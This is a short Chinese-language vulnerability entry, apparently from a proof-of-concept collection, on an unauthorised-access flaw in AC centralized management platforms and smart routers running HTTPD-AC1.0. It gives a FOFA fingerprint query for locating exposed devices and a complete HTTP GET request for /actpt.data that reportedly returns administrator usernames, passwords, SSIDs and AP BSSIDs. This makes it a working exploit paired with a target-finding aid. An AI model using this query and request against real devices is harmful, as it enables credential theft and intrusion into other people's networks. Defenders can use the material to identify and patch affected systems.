# AC集中管理平台未授权漏洞

多款AC集中管理平台、智能AC管理系统、智能路由系统(HTTPD-AC1.0服务)均被发现存在严重的未授权访问安全漏洞。此漏洞允许攻击者未经授权地直接访问多个data文件，进而非法获取包括AC用户名、密码、SSID（服务集标识符）、AP BSSID（接入点基站标识符）等在内的敏感及关键信息，对系统安全构成重大威胁。

## fofa

```javascript
header="HTTPD_ac 1.0"
```

## poc

```javascript
GET /actpt.data HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
```

![2564642ff99c1ab0e34d89aaf507ef65](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409171614315.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/C7YKQlMtzWhC29M3F17CiQ